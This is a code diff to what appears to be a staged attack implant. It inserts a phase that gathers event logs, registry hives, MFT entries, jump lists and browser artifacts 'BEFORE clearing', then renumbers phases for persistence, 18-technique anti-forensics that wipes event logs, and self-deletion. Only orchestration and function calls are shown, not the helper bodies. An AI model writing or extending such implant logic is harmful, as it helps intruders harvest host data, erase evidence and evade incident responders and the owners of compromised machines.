@@ -359,9 +359,60 @@ fn phase_persistence() -> bool {
     return true
 }
 
-// ===== PHASE 10: COMPREHENSIVE ANTI-FORENSICS (18 TECHNIQUES) =====
+// ===== PHASE 10: FORENSIC ANALYSIS & COLLECTION =====
+fn phase_forensic_analysis() -> bool {
+    println("[*] Phase 10: Forensic Evidence Collection & Analysis")
+
+    // Collect event logs BEFORE clearing
+    let security_log = forensic_collect_event_logs("Security")
+    println("    [+] Security event log collected")
+
+    let system_log = forensic_collect_event_logs("System")
+    println("    [+] System event log collected")
+
+    // Collect registry hives for forensics
+    let software_hive = forensic_collect_registry_hive("Software")
+    println("    [+] Software registry hive collected")
+
+    let system_hive = forensic_collect_registry_hive("System")
+    println("    [+] System registry hive collected")
+
+    // Process tree forensics
+    let process_tree = forensic_analyze_process_tree()
+    println("    [+] Process tree analyzed")
+
+    // MFT analysis (Master File Table)
+    let mft_entries = forensic_analysis_mft()
+    println("    [+] MFT analysis complete")
+
+    // Jump List parsing
+    let jump_lists = forensic_analysis_jump_lists()
+    println("    [+] Jump lists analyzed")
+
+    // Browser artifact analysis
+    let browser_artifacts = forensic_analysis_browser_artifacts()
+    println("    [+] Browser artifacts analyzed")
+
+    // Build timeline from collected evidence
+    let timeline = forensic_timeline_builder()
+    println("    [+] Forensic timeline constructed")
+
+    // Correlation analysis
+    forensic_correlation_engine()
+    println("    [+] Forensic correlation complete")
+
+    // Export findings
+    let report = forensic_generate_report()
+    println("    [+] Forensic report generated")
+
+    println("[+] Forensic analysis phase complete")
+    println("")
+    return true
+}
+
+// ===== PHASE 11: COMPREHENSIVE ANTI-FORENSICS (18 TECHNIQUES) =====
 fn phase_anti_forensics() -> bool {
-    println("[*] Phase 10: Anti-Forensics (18 Techniques)")
+    println("[*] Phase 11: Anti-Forensics (18 Techniques)")
 
     // Event Logs
     jocky_cleanup_event_logs("Security")
@@ -454,9 +505,9 @@ fn phase_anti_forensics() -> bool {
     return true
 }
 
-// ===== PHASE 11: SELF-DELETION =====
+// ===== PHASE 12: SELF-DELETION =====
 fn phase_self_delete() -> bool {
-    println("[*] Phase 11: Self-Deletion Protocol")
+    println("[*] Phase 12: Self-Deletion Protocol")
 
     println("    [*] Initiating self-deletion...")
     jocky_self_delete()
@@ -510,10 +561,13 @@ fn main() -> i32 {
     // Phase 9: Persistence
     let _ = phase_persistence()
 
-    // Phase 10: Anti-Forensics
+    // Phase 10: Forensic Analysis
+    let _ = phase_forensic_analysis()
+
+    // Phase 11: Anti-Forensics
     let _ = phase_anti_forensics()
 
-    // Phase 11: Self-Delete
+    // Phase 12: Self-Delete
     let _ = phase_self_delete()
 
     println("")
